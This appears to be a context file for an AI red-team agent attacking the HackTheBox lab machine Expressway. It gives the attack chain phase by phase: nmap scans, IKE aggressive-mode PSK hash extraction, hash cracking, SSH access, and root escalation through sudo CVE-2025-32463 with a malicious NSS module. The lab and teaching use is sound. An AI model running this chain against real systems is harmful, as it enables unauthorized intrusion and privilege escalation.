# Red Team Agent Context: Quick Start Guide

## Who You Are

**Identity**: Red Team Operator for HTB Expressway
**Agent Location**: `/cyber-agent/agents/redteam_agent/`
**Target Machine**: Expressway (HackTheBox Season 9)

---

## Your Mission

> **"Execute authorized penetration test, discover vulnerabilities, capture user.txt and root.txt flags"**

---

## Target Information

| Attribute | Value |
|-----------|-------|
| **Machine Name** | Expressway |
| **Platform** | HackTheBox Season 9 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Target IP** | Provided by user |
| **Hostname** | expressway.htb |

---

## Attack Phases (PTES Methodology)

### Phase 1: Reconnaissance
```bash
# TCP port scan - find SSH
nmap -sV -sC -p- {TARGET_IP}

# UDP port scan - CRITICAL for finding IKE
nmap -sU -sV --top-ports 100 {TARGET_IP}
```

**Expected**: SSH (22/TCP), ISAKMP (500/UDP)

### Phase 2: IKE/IPsec Enumeration
```bash
# Basic IKE discovery
ike-scan {TARGET_IP}

# Aggressive mode (reveals identity)
ike-scan -A {TARGET_IP}

# Extract PSK hash
ike-scan -A {TARGET_IP} --id=ike@expressway.htb -P ike.psk
```

**Expected**: Identity `ike@expressway.htb`, PSK hash extracted

### Phase 3: Credential Cracking
```bash
# Crack PSK with dictionary
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk

# Alternative: hashcat (mode 5400 for IKE-PSK SHA1)
hashcat -m 5400 ike.psk /usr/share/wordlists/rockyou.txt
```

**Expected**: Plaintext password recovered

### Phase 4: Initial Access
```bash
# SSH with discovered credentials
ssh ike@{TARGET_IP}

# Get user flag
cat ~/user.txt
```

**Expected**: User shell, user.txt flag

### Phase 5: Privilege Escalation
```bash
# Check sudo location
which sudo                    # /usr/local/bin/sudo (non-standard!)
/usr/local/bin/sudo --version # Check if <= 1.9.17

# Vulnerable to CVE-2025-32463
# Create exploit, compile, execute
```

**Expected**: Root shell via CVE-2025-32463

### Phase 6: Post-Exploitation
```bash
# Get root flag
cat /root/root.txt
```

**Expected**: root.txt flag

---

## Key Vulnerabilities

### VULN-001: IKE Service Exposed (MEDIUM)
- Port 500/UDP exposed
- Allows VPN enumeration

### VULN-002: IKE Aggressive Mode (HIGH)
- Identity leaked: `ike@expressway.htb`
- PSK hash extractable for offline cracking
- Weak crypto: 3DES, SHA1

### VULN-003: Sudo CVE-2025-32463 (CRITICAL)
- **Affected**: sudo <= 1.9.17
- **Location**: /usr/local/bin/sudo
- **Method**: NSS module loading via chroot
- **Result**: Local privilege escalation to root

---

## CVE-2025-32463 Exploitation

The exploit requires:
1. Create chroot directory with custom nsswitch.conf
2. Compile malicious NSS module (libnss_pwn.so.2)
3. Trigger via: `/usr/local/bin/sudo -h /chroot/path bash`

**Exploit code**: Generate when ready to escalate. The agent will create the C code, compile it, and execute.

---

## File Locations

### Your Home (Documentation)
```
agents/redteam_agent/
├── AGENTS.md      # Who you are
├── CONTEXT.md     # This file
├── SKILLS.md      # How-to guides
├── TODO.md        # Tasks to complete
├── docs/          # Reference documentation
├── notes/         # Session notes
├── scripts/       # Attack scripts
└── sessions/      # Attack logs for Report Agent
```

---

## Output for Report Agent

After completing attack, save findings to:
```
sessions/attack_session_{TARGET_IP}_{DATE}.md
```

Include:
- All commands executed
- All outputs received
- All vulnerabilities found
- Credentials discovered
- Flags captured
- Attack timeline

---

## Common Commands Reference

```bash
# Reconnaissance
nmap -sV -sC -p- {IP}              # TCP scan
nmap -sU --top-ports 100 {IP}       # UDP scan

# IKE Enumeration
ike-scan {IP}                       # Basic
ike-scan -A {IP}                    # Aggressive
ike-scan -A {IP} --id=X -P out.psk  # Extract PSK

# Credential Cracking
psk-crack -d rockyou.txt file.psk   # PSK crack
hashcat -m 5400 hash wordlist       # hashcat

# Access
ssh user@{IP}                       # SSH login
cat ~/user.txt                      # User flag

# Privilege Escalation
which sudo                          # Find sudo
sudo --version                      # Check version
sudo -l                             # Check permissions

# Post-Exploitation
cat /root/root.txt                  # Root flag
```

---

## Checklist

- [ ] Receive target IP from user
- [ ] Phase 1: Reconnaissance (TCP + UDP)
- [ ] Phase 2: IKE enumeration
- [ ] Phase 3: Crack PSK
- [ ] Phase 4: SSH access + user flag
- [ ] Phase 5: Privilege escalation
- [ ] Phase 6: Root flag
- [ ] Document all findings for Report Agent

---

**Ready to Attack. Awaiting Target IP.**
